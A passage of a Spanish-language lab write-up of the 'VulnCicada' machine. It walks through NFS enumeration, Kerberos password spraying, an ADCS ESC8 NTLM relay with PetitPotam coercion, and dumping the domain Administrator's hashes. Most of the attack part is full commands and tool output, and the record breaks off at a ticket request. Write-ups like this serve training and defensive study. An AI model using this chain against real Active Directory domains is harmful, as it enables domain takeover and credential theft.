# Resolución maquina VulnCicada

**Autor:** PepeMaquina  
**Fecha:** 15 de Enero de 2026
**Dificultad:** Medio  
**Sistema Operativo:** Windows  
**Tags:** Kerberos, NFS, ADCS.

---
## Imagen de la Máquina

![](vulnc1.jpg)

*Imagen: VulnCicada.JPG*
## Reconocimiento Inicial

### Escaneo de Puertos
Comenzamos con un escaneo completo de nmap para identificar servicios expuestos:
~~~ bash
sudo nmap -p- --open -sS -vvv --min-rate 5000 -n -Pn 10.10.64.82 -oG networked
~~~
Luego queda realizar un escaneo detallado de puertos abiertos:
~~~ bash
sudo nmap -sCV -p53,80,88,111,135,139,389,445,464,636,2049,3268,3269,3389,9389,49664,49669,49670,52092,52491,53091,59784,59858 10.129.64.82 -oN targeted
~~~
### Enumeración de Servicios

~~~bash
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-15 17:28:32Z)
111/tcp   open  rpcbind?
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC-JPQ225.cicada.vl
| Not valid before: 2026-01-15T17:10:23
|_Not valid after:  2027-01-15T17:10:23
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC-JPQ225.cicada.vl
| Not valid before: 2026-01-15T17:10:23
|_Not valid after:  2027-01-15T17:10:23
|_ssl-date: TLS randomness does not represent time
2049/tcp  open  mountd        1-3 (RPC #100005)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC-JPQ225.cicada.vl
| Not valid before: 2026-01-15T17:10:23
|_Not valid after:  2027-01-15T17:10:23
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC-JPQ225.cicada.vl
| Not valid before: 2026-01-15T17:10:23
|_Not valid after:  2027-01-15T17:10:23
|_ssl-date: TLS randomness does not represent time
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Not valid before: 2026-01-14T17:18:02
|_Not valid after:  2026-07-16T17:18:02
|_ssl-date: 2026-01-15T17:30:10+00:00; +3s from scanner time.
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
52092/tcp open  msrpc         Microsoft Windows RPC
52491/tcp open  msrpc         Microsoft Windows RPC
53091/tcp open  msrpc         Microsoft Windows RPC
59784/tcp open  msrpc         Microsoft Windows RPC
59858/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC-JPQ225; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-01-15T17:29:32
|_  start_date: N/A
|_clock-skew: mean: 2s, deviation: 0s, median: 1s
~~~
### Enumeración de nombre del dominio
Lo primero que intento obtener es el nombre del dominio, al intentar ingresar con credenciales nulas o como invitado esto no muestra ningún dominio.
~~~ bash
┌──(kali㉿kali)-[~/htb/vulncicada/nmap]
└─$ sudo netexec smb 10.129.63.115 -u '' -p ''     
[sudo] password for kali: 
SMB         10.129.63.115   445    10.129.63.115    [*]  x64 (name:10.129.63.115) (domain:10.129.63.115) (signing:True) (SMBv1:False) (NTLM:False)
SMB         10.129.63.115   445    10.129.63.115    [-] 10.129.63.115\: STATUS_NOT_SUPPORTED 
                                                                                                                                                            
┌──(kali㉿kali)-[~/htb/vulncicada/nmap]
└─$ sudo netexec smb 10.129.63.115 -u 'ut' -p ''
SMB         10.129.63.115   445    10.129.63.115    [*]  x64 (name:10.129.63.115) (domain:10.129.63.115) (signing:True) (SMBv1:False) (NTLM:False)
SMB         10.129.63.115   445    10.129.63.115    [-] 10.129.63.115\ut: STATUS_NOT_SUPPORTED
~~~
Si bien no se puede obtener el nombre del dominio con netexec, esto si se pudo obtener al inicio con la enumeración de nmap, asi que se agrega el nombre de dominio directamente en el archivo "/etc/hosts".
~~~bash
┌──(kali㉿kali)-[~/htb/vulncicada/nmap]
└─$ cat /etc/hosts | grep '10.129.64' 
10.129.64.82 DC-JPQ225.cicada.vl cicada.vl DC-JPQ225
~~~

### Enumeración NFS
Al realizar enumeración siguiendo la metodología, se pudo observar que se puede ingresar con credenciales nulas, credenciales como invitado a ningun servicio relacionado a SMB, ldap, rpc ni otro.
Adicionalmente enumerando la página web se ve que no contiene información alguna y es una pagina por defecto ISS.

Al ver los puertos abiertos con nmap, se pudo ver que existe el servicio NFS, por lo que se procede a ver si existe alguna carpeta que se puede montar en mi maquina.
~~~bash
┌──(kali㉿kali)-[~/htb/vulncicada/nmap]
└─$ showmount -e 10.129.63.115 
Export list for 10.129.63.115:
/profiles (everyone)
~~~
Existe el directorio "profiles" disponible para todo el mundo, asi que se procede a montarlo.
Primero se crea una carpeta donde se quiere montar.
~~~bash
┌──(kali㉿kali)-[~/htb/vulncicada/content]
└─$ mkdir targetnfs
~~~
Luego se procede a montar todo lo que exista dentro de NFS.
~~~bash
┌──(kali㉿kali)-[~/htb/vulncicada/content]
└─$ sudo mount -t nfs 10.129.63.115:/ ./targetnfs/ -o nolock
~~~
Algo importante para ver los archivos de un recurso montado por NFS, es que se debe ingresar como super usuario para no causar accesos denegados a ciertos directorios.
~~~bash
┌──(kali㉿kali)-[~/…/content/targetnfs]
└─$ sudo su
~~~
Ahora enumerando el contenido del directorios.
~~~bash
┌──(root㉿kali)-[/home/…/vulncicada/content/targetnfs/profiles]
└─# tree .
.
├── Administrator
│   ├── Documents
│   │   ├── $RECYCLE.BIN
│   │   │   └── desktop.ini
│   │   └── desktop.ini
│   └── vacation.png
├── Daniel.Marshall
├── Debra.Wright
├── Jane.Carter
├── Jordan.Francis
├── Joyce.Andrews
├── Katie.Ward
├── Megan.Simpson
├── Richard.Gibbons
├── Rosie.Powell
│   ├── Documents
│   │   ├── $RECYCLE.BIN
│   │   │   └── desktop.ini
│   │   └── desktop.ini
│   └── marketing.png
└── Shirley.West
~~~
Se ve una gran cantidad de nombres de usuarios, eso puede ser util asi que se agrega a un archivo especial con todos los nombres de usuarios encontrados.

Adicionalmente se puede ver que existen algunas imagenes y accesos directos, esto parece ser capetas de trabajo de los usuarios, entonces procedo a ver las fotos.
Primero veo la foto de la carpeta administrator.

![](vulnc2.jpg)

Esto no muestra mucho, como su nombre lo dice es una foto de sus vacaciones.
Ahora viendo la otra foto dentro de la carpeta de trabajo de "Rosie.Powell".

![](vulnc3.jpg)

Esta si es mas interesante, se puede ver una nota con una posible contraseña, eso lo apunto en un archivo de contraseñas con ciertas variantes como:
~~~bash
┌──(kali㉿kali)-[~/htb/vulncicada]
└─$ cat pass                         
cicada123
Cicada123
cicadaI23
~~~
Ahora vuelvo a realizar un "Rociado de contraseñas" para ver si alguna coincide.
~~~bash
┌──(kali㉿kali)-[~/htb/vulncicada]
└─$ sudo netexec smb 10.129.63.115 -u users -p users --continue-on-success
SMB         10.129.63.115   445    10.129.63.115    [*]  x64 (name:10.129.63.115) (domain:10.129.63.115) (signing:True) (SMBv1:False) (NTLM:False)
SMB         10.129.63.115   445    10.129.63.115    [-] 10.129.63.115\Administrator:Administrator STATUS_NOT_SUPPORTED 
SMB         10.129.63.115   445    10.129.63.115    [-] 10.129.63.115\Daniel.Marshall:Administrator STATUS_NOT_SUPPORTED 
SMB         10.129.63.115   445    10.129.63.115    [-] 10.129.63.115\Debra.Wright:Administrator STATUS_NOT_SUPPORTED 
SMB         10.129.63.115   445    10.129.63.115    [-] 10.129.63.115\Jane.Carter:Administrator STATUS_NOT_SUPPORTED 
SMB         10.129.63.115   445    10.129.63.115    [-] 10.129.63.115\Jordan.Francis:Administrator STATUS_NOT_SUPPORTED 
SMB         10.129.63.115   445    10.129.63.115    [-] 10.129.63.115\Joyce.Andrews:Administrator STATUS_NOT_SUPPORTED 
SMB         10.129.63.115   445    10.129.63.115    [-] 10.129.63.115\Katie.Ward:Administrator STATUS_NOT_SUPPORTED
.................. 
<SNIP>
..................
~~~
Con las primeras pruebas noto algo raro, el mansaje no sale como si fueran credenciales invalidas, sino muestra un mensaje de "STATUS_NOT_SUPPORTED", esto quiere decir que posiblemente no permita la autenticación normal ni por NTLM, por lo que procedo a realizar enumeración por kerberos.
Antes que modifico el archivo "/etc/krb5.conf" para asegurarme de no tener problemas con kerberos.
~~~bash 
cat /etc/krb5.conf  
[libdefaults]
        default_realm = CICADA.VL

# The following krb5.conf variables are only for MIT Kerberos.
        kdc_timesync = 1
        ccache_type = 4
        forwardable = true
        proxiable = true
        rdns = false
        dns_lookup_kdc = false
        dns_lookup_realm = false


# The following libdefaults parameters are only for Heimdal Kerberos.
        fcc-mit-ticketflags = true

[realms]
        CICADA.VL = {
                kdc = 10.10.64.82
                kdc = kerberos-1.mit.edu
                kdc = kerberos-2.mit.edu:88
                admin_server = 10.10.64.82
                default_domain = mit.edu
        }
		<SNIP>

[domain_realm]
        <SNIP>
        .cicada.vl = CICADA.VL
        cicada.vl = CICADA.VL
~~~
Ahora si se puede a enumerar credenciales con kerberos.
~~~bash
┌──(kali㉿kali)-[~/htb/vulncicada]
└─$ sudo netexec smb DC-JPQ225.cicada.vl -u users -p pass --continue-on-success -k
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:False) (NTLM:False)
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [-] cicada.vl\Administrator:cicada123 KDC_ERR_PREAUTH_FAILED 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [-] cicada.vl\cicada123:cicada123 KDC_ERR_C_PRINCIPAL_UNKNOWN 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [-] cicada.vl\Daniel.Marshall:cicada123 KDC_ERR_PREAUTH_FAILED 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [-] cicada.vl\Debra.Wright:cicada123 KDC_ERR_PREAUTH_FAILED 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [-] cicada.vl\Jane.Carter:cicada123 KDC_ERR_PREAUTH_FAILED 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [-] cicada.vl\Jordan.Francis:cicada123 KDC_ERR_PREAUTH_FAILED 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [-] cicada.vl\Joyce.Andrews:cicada123 KDC_ERR_PREAUTH_FAILED 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [-] cicada.vl\Katie.Ward:cicada123 KDC_ERR_PREAUTH_FAILED 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [-] cicada.vl\Megan.Simpson:cicada123 KDC_ERR_PREAUTH_FAILED 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [-] cicada.vl\Richard.Gibbons:cicada123 KDC_ERR_PREAUTH_FAILED 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [-] cicada.vl\Rosie.Powell:cicada123 KDC_ERR_PREAUTH_FAILED 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [-] cicada.vl\Shirley.West:cicada123 KDC_ERR_CLIENT_REVOKED 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [-] cicada.vl\Administrator:Cicada123 KDC_ERR_PREAUTH_FAILED 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [-] cicada.vl\cicada123:Cicada123 KDC_ERR_C_PRINCIPAL_UNKNOWN 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [-] cicada.vl\Daniel.Marshall:Cicada123 KDC_ERR_PREAUTH_FAILED 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [-] cicada.vl\Debra.Wright:Cicada123 KDC_ERR_PREAUTH_FAILED 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [-] cicada.vl\Jane.Carter:Cicada123 KDC_ERR_PREAUTH_FAILED 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [-] cicada.vl\Jordan.Francis:Cicada123 KDC_ERR_PREAUTH_FAILED 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [-] cicada.vl\Joyce.Andrews:Cicada123 KDC_ERR_PREAUTH_FAILED 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [-] cicada.vl\Katie.Ward:Cicada123 KDC_ERR_PREAUTH_FAILED 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [-] cicada.vl\Megan.Simpson:Cicada123 KDC_ERR_PREAUTH_FAILED 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [-] cicada.vl\Richard.Gibbons:Cicada123 KDC_ERR_PREAUTH_FAILED 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] cicada.vl\Rosie.Powell:Cicada123 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [-] cicada.vl\Shirley.West:Cicada123 KDC_ERR_CLIENT_REVOKED 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [-] cicada.vl\Administrator:cicadaI23 KDC_ERR_PREAUTH_FAILED 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [-] cicada.vl\cicada123:cicadaI23 KDC_ERR_C_PRINCIPAL_UNKNOWN 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [-] cicada.vl\Daniel.Marshall:cicadaI23 KDC_ERR_PREAUTH_FAILED 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [-] cicada.vl\Debra.Wright:cicadaI23 KDC_ERR_PREAUTH_FAILED 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [-] cicada.vl\Jane.Carter:cicadaI23 KDC_ERR_PREAUTH_FAILED 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [-] cicada.vl\Jordan.Francis:cicadaI23 KDC_ERR_PREAUTH_FAILED 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [-] cicada.vl\Joyce.Andrews:cicadaI23 KDC_ERR_PREAUTH_FAILED 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [-] cicada.vl\Katie.Ward:cicadaI23 KDC_ERR_PREAUTH_FAILED 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [-] cicada.vl\Megan.Simpson:cicadaI23 KDC_ERR_PREAUTH_FAILED 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [-] cicada.vl\Richard.Gibbons:cicadaI23 KDC_ERR_PREAUTH_FAILED 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [-] cicada.vl\Shirley.West:cicadaI23 KDC_ERR_CLIENT_REVOKED
~~~
Efectivamente, ahora si se tiene un usuario valido, asi que procedo a enumerar sus recursos compartidos.
~~~bash
┌──(kali㉿kali)-[~/htb/vulncicada]
└─$ sudo netexec smb DC-JPQ225.cicada.vl -u 'Rosie.Powell' -p 'Cicada123' --shares -k
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:False) (NTLM:False)
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] cicada.vl\Rosie.Powell:Cicada123 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*] Enumerated shares
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        Share           Permissions     Remark
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        -----           -----------     ------
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        ADMIN$                          Remote Admin
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        C$                              Default share
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        CertEnroll      READ            Active Directory Certificate Services share
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        IPC$            READ            Remote IPC
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        NETLOGON        READ            Logon server share 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        profiles$       READ,WRITE      
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        SYSVOL          READ            Logon server share 
~~~
Se puede ver un recurso compartido que al que no se tuvo acceso, este es "CertEnroll".
Para entrar al recurso compartido, primero genero un ticket y lo importo en memoria.
~~~bash
┌──(kali㉿kali)-[~/htb/vulncicada]
└─$ impacket-getTGT cicada.vl/Rosie.Powell:Cicada123
Impacket v0.14.0.dev0+20251117.163331.7bd0d5ab - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in Rosie.Powell.ccache


┌──(kali㉿kali)-[~/htb/vulncicada]
└─$ export KRB5CCNAME=$(pwd)/Rosie.Powell.ccache
~~~
Ahora si puedo entrar por smbclient y ver el contenido del recurso compartido.
~~~bash
┌──(kali㉿kali)-[~/htb/vulncicada]
└─$ krb5ccname=Rosie.Powell.ccache smbclient.py -k DC-JPQ225.cicada.vl               
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# ls
[-] No share selected
# shares
ADMIN$
C$
CertEnroll
IPC$
NETLOGON
profiles$
SYSVOL
# use CertEnroll
# ls
drw-rw-rw-          0  Thu Jan 15 12:24:12 2026 .
drw-rw-rw-          0  Fri Sep 13 11:17:59 2024 ..
-rw-rw-rw-        741  Thu Jan 15 12:19:10 2026 cicada-DC-JPQ225-CA(1)+.crl
-rw-rw-rw-        933  Thu Jan 15 12:19:10 2026 cicada-DC-JPQ225-CA.crl
.........................
<SNIP>
.........................
-rw-rw-rw-       1385  Sun Sep 15 09:18:43 2024 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(0-1).crt
-rw-rw-rw-       1390  Thu Apr 10 04:56:48 2025 DC-JPQ225.cicada.vl_cicada-DC-
-rw-rw-rw-        331  Fri Sep 13 11:17:59 2024 nsrev_cicada-DC-JPQ225-CA.asp
~~~
Este contiene un monton de archivos, pero salta a mi vista uno que se llama "nsrev_cicada-DC-JPQ225-CA.asp".
Esto es un poco de razonamiento, viendo que existen certificados, viendo un archivo con extension .asp y viendo que existe el puerto 80 abierto, esto me hace pensar que posiblemente pueda existir una vulnerabilidad ESC8 de certificados donde se utiliza http para poder autenticarse y utilizando un ataque relay poder obtener el certificado de un usuario con usuario mayor o incluso la maquina.

---
## Escalada de Privilegios
### ESC8
Todo lo dicho anteriormente es una teoria, entonces para asegurarse se procede a usar "certipy-ad" para ver si existe una vulnerabilidad en algun template.
~~~bash
┌──(kali㉿kali)-[~/htb/vulncicada]
└─$ certipy-ad find -u 'Rosie.Powell@cicada.vl' -p 'Cicada123' -target DC-JPQ225.cicada.vl -stdout -vulnerable -k            
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: DC-JPQ225.cicada.vl.
[!] Use -debug to print a stacktrace
[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'cicada-DC-JPQ225-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'cicada-DC-JPQ225-CA'
[*] Checking web enrollment for CA 'cicada-DC-JPQ225-CA' @ 'DC-JPQ225.cicada.vl'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : cicada-DC-JPQ225-CA
    DNS Name                            : DC-JPQ225.cicada.vl
    Certificate Subject                 : CN=cicada-DC-JPQ225-CA, DC=cicada, DC=vl
    Certificate Serial Number           : 318212BDCFD72E9E45E369CB1D06246B
    Certificate Validity Start          : 2026-01-15 17:14:02+00:00
    Certificate Validity End            : 2526-01-15 17:24:02+00:00
    Web Enrollment
      HTTP
        Enabled                         : True
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : CICADA.VL\Administrators
      Access Rights
        ManageCa                        : CICADA.VL\Administrators
                                          CICADA.VL\Domain Admins
                                          CICADA.VL\Enterprise Admins
        ManageCertificates              : CICADA.VL\Administrators
                                          CICADA.VL\Domain Admins
                                          CICADA.VL\Enterprise Admins
        Enroll                          : CICADA.VL\Authenticated Users
    [!] Vulnerabilities
      ESC8                              : Web Enrollment is enabled over HTTP.
Certificate Templates                   : [!] Could not find any certificate templates
~~~
Efectivamente existe la vulnerabilidad y esta es la ESC8 que se menciono anteriormente, con esto presente existen varias formas de realizar este ataque, revisando mis apuntes, el sitio oficial "https://github.com/ly4k/Certipy/wiki/06-%e2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu" y distintas fuentes de escalada ESC8 (https://adminions.ca/books/adcs/page/esc8), se plantea realizar la forma mas sencilla.

Primero se configura el registro DNS agregando uno "vacio", esto se crea uniendo:
- El host del dominio: DC-JPQ225.
- Agregando el "CREDENTIAL_TARGET_INFORMATION" vacio: `1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA`-
Finalmente uniendo ambos se tiene el registro final: `DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA`, y tambien no olvidar agregar la ip de la maquina con la que se esta tacando.
~~~bash
┌──(kali㉿kali)-[~/htb/vulncicada]
└─$ bloodyAD -u 'Rosie.Powell' -p 'Cicada123' -d cicada.vl -k --host DC-JPQ225.cicada.vl add dnsRecord DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA 10.10.15.165   

[+] DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA has been successfully added
~~~
Posteriormente en otra terminal se debe abrir algun retransmisor NTLM para retrasmitir la autenticacion NTLM a la inscripsion web de ADCS, para esto existen varias herramientas pero yo utilizo la que viene incluida en "certipy-ad"
~~~bash
┌──(kali㉿kali)-[~/htb/vulncicada]
└─$ certipy-ad relay -target 'http://dc-jpq225.cicada.vl/' -template DomainController
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Targeting http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp (ESC8)
[*] Listening on 0.0.0.0:445
[*] Setting up SMB Server on port 445
~~~
Una vez esto se mantenga en escucha, desde otra shell debo forzar la autenticación de la maquina, para ello primero utilizo el modulo de netexec "coerce_plus" para comprobar métodos diferentes para forzar la autenticación desde la cuenta de la máquina.
~~~bash
┌──(kali㉿kali)-[~/htb/vulncicada]
└─$ sudo netexec smb DC-JPQ225.cicada.vl -u 'Rosie.Powell' -p 'Cicada123' -k -M coerce_plus 
[sudo] password for kali: 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:False) (NTLM:False)
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] cicada.vl\Rosie.Powell:Cicada123 
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, DFSCoerce
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, PetitPotam
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, PrinterBug
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, PrinterBug
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, MSEven
~~~
Se puede ver distintos ataques, el mas conocido es "PetitPotam" aunque en teoria deberia funcionar con todos estos metodos.
Para usar petitpotam se puede usar la herramienta de github, pero netexec tiene integrado un metodo para utilizarlo.
~~~bash
┌──(kali㉿kali)-[~/htb/vulncicada]
└─$ sudo netexec smb DC-JPQ225.cicada.vl  -u Rosie.Powell -p Cicada123 -k -M coerce_plus -o LISTENER=DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA METHOD=PetitPotam
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:False) (NTLM:False)
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] cicada.vl\Rosie.Powell:Cicada123 
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, PetitPotam
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        Exploit Success, lsarpc\EfsRpcAddUsersToFile
~~~
Al ejecutar "PetitPotam" esto fuerza la autenticacion de la maquina, por lo que si se ejecuta bien, en la shell de "certipy relay" deberia retransmitir la autenticacion obteniendo un certificado para la maquina.
~~~bash
──(kali㉿kali)-[~/htb/vulncicada]
└─$ certipy-ad relay -target 'http://dc-jpq225.cicada.vl/' -template DomainController
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Targeting http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp (ESC8)
[*] Listening on 0.0.0.0:445
[*] Setting up SMB Server on port 445
[*] (SMB): Received connection from 10.129.64.82, attacking target http://dc-jpq225.cicada.vl
[*] HTTP Request: GET http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp "HTTP/1.1 401 Unauthorized"
[*] HTTP Request: GET http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp "HTTP/1.1 401 Unauthorized"
[*] HTTP Request: GET http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp "HTTP/1.1 200 OK"
[*] (SMB): Authenticating connection from /@10.129.64.82 against http://dc-jpq225.cicada.vl SUCCEED [1]
[*] Requesting certificate for '\\' based on the template 'DomainController'
[*] (SMB): Received connection from 10.129.64.82, attacking target http://dc-jpq225.cicada.vl
[*] HTTP Request: GET http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp "HTTP/1.1 401 Unauthorized"
[*] HTTP Request: GET http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp "HTTP/1.1 401 Unauthorized"
[*] http:///@dc-jpq225.cicada.vl [1] -> HTTP Request: POST http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp "HTTP/1.1 200 OK"
[*] Certificate issued with request ID 89
[*] Retrieving certificate for request ID: 89
[*] http:///@dc-jpq225.cicada.vl [1] -> HTTP Request: GET http://dc-jpq225.cicada.vl/certsrv/certnew.cer?ReqID=89 "HTTP/1.1 200 OK"
[*] Got certificate with DNS Host Name 'DC-JPQ225.cicada.vl'
[*] Certificate object SID is 'S-1-5-21-687703393-1447795882-66098247-1000'
[*] Saving certificate and private key to 'dc-jpq225.pfx'
[*] Wrote certificate and private key to 'dc-jpq225.pfx'
~~~
Esto surgio efecto, se tiene el pfx de la maquina.
Si bien recordamos, la autenticacion NTLM estaba deshabilitada, por lo que necesito conectarme por kerberos utilizando el ticket de la maquina.
~~~bash
┌──(kali㉿kali)-[~/htb/vulncicada]
└─$ export KRB5CCNAME=$(pwd)/dc-jpq225.ccache
~~~
Con esto ya podria dumpear el NTDS para obtener las credenciales NTLM del usuario administrator.
~~~bash
┌──(kali㉿kali)-[~/htb/vulncicada]
└─$ impacket-secretsdump -k -no-pass -dc-ip 10.129.64.82 -just-dc-user Administrator 'cicada.vl/dc-jpq225$'@DC-JPQ225.cicada.vl     
Impacket v0.14.0.dev0+20251117.163331.7bd0d5ab - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:85a0da53871a9d56b6cd05deda3a5e87:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:f9181ec2240a0d172816f3b5a185b6e3e0ba773eae2c93a581d9415347153e1a
Administrator:aes128-cts-hmac-sha1-96:926e5da4d5cd0be6e1cea21769bb35a4
Administrator:des-cbc-md5:fd2a29621f3e7604
[*] Cleaning up...
~~~
Como solo se vio el servicio RDP corriendo y parece no funcionar, primero se obtiene el tgt de administrator.
~~~bash
┌──(kali㉿kali)-[~/htb/vulncicada]
└─$ impacket-getTGT -dc-ip 10.129.64.82 cicada.vl/administrator -hashes aad3b435b51404eeaad3b435b51404ee:85a0da53871a9d56b6cd05deda3a5e87
